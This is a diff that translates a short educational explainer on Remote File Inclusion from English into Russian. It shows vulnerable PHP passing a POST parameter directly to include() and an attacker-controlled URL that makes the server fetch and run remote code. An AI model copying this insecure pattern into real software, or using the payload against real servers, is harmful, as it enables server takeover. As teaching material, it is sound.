@@ -1,20 +1,22 @@
-# Remote File Inclusion
+```markdown
+# Удалённое включение файлов (Remote File Inclusion)
 
-## Concept
+## Концепция
 
-RFI (Remote File Inclusion) vulnerabilities allow attackers to include and execute remote files on the target server by leveraging user-controllable inputs that specify a remote file URL.
+Уязвимости RFI (Remote File Inclusion) позволяют злоумышленникам включать и выполнять удалённые файлы на целевом сервере, используя управляемые пользователем входные данные, которые указывают на URL удалённого файла.
 
-## Attack Principle
+## Принцип атаки
 
-When an application processes requests involving external file inclusion, if it fails to strictly validate and filter the input URL, an attacker can input a URL pointing to a malicious file on their server. This causes the server to load and execute the code in the remote malicious file.
+Когда приложение обрабатывает запросы, связанные с включением внешних файлов, если оно не выполняет строгую проверку и фильтрацию вводимого URL, злоумышленник может указать URL, ведущий к вредоносному файлу на своём сервере. Это приводит к тому, что сервер загружает и выполняет код из удалённого вредоносного файла.
 
-## Attack Example
+## Пример атаки
 
-Assume a blog platform permits users to specify a custom template URL via a POST request. The code is as follows:
+Предположим, платформа для блогов позволяет пользователям указывать пользовательский URL шаблона через POST-запрос. Код выглядит следующим образом:
 
 ```php
 $templateUrl = $_POST['template_url'];
 include($templateUrl);
 ```
 
-If an attacker sets the `template_url` parameter to `http://attacker-controlled-server/malicious-template.php`, the server will fetch and execute the PHP code in the remote malicious file during processing, enabling the attacker to gain control of the server.
+Если злоумышленник установит параметр `template_url` в значение `http://attacker-controlled-server/malicious-template.php`, сервер во время обработки запроса загрузит и выполнит PHP-код из удалённого вредоносного файла. Это позволит злоумышленнику получить контроль над сервером.
+```
